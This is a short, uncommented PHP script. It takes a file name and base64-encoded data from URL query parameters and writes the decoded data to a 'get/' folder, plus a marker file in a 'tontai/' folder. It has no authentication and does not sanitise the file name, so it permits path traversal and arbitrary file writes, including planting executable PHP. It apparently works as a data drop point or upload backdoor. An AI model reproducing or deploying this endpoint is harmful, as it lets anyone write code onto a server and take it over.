<?php
if (isset($_GET['name'])) {
    $filename = ($_GET['name']);
    $data = base64_decode($_GET['data']);
    $get = "get/".$filename;
    $get2 = "tontai/".$filename;
    $myfile = fopen($get, "w") or die("1error");
    fwrite($myfile, $data);
    fclose($myfile);
    $myfile2 = fopen($get2, "w") or die("2error");
    fwrite($myfile2, "1");
    fclose($myfile2);
}